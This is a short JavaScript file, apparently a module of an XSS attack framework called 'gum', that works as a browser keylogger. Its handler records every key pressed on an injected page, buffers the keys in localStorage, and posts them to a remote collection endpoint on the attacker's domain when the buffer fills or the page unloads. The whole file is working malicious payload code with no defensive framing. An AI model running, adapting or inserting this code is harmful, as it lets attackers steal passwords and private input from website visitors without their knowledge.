/*
    quininer[http://wiremask.eu/xss-keylogger/] - 140505
    keylogger - null
        - keylogger(local + Not IME)
            gum_postkeylogs()
        and
            browserinfo['keylogs'] = b64ens(request.forms.keylogs)
 */
if ('gum_keyslog' in window.localStorage){
    window.localStorage.setItem('gum_keyslog', '')
};

function gum_postkeylogs(){
    gum.post('http://'+gum.domain+'/ing',
        {'keylogs':window.localStorage.getItem('gum_keyslog')});
    window.localStorage.gum_keyslog = '';
};

document.onkeypress = function(e){
    var get = window.event?event:e;
    var key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    window.localStorage.gum_keyslog += key;
    if(window.localStorage.gum_keyslog.length >= 2500*1000){
        gum_postkeylogs();
    };
};

if(gum.jquery()){
    $(window).unload(gum_postkeylogs);
}else{
    window.onbeforeunload = gum_postkeylogs;
};
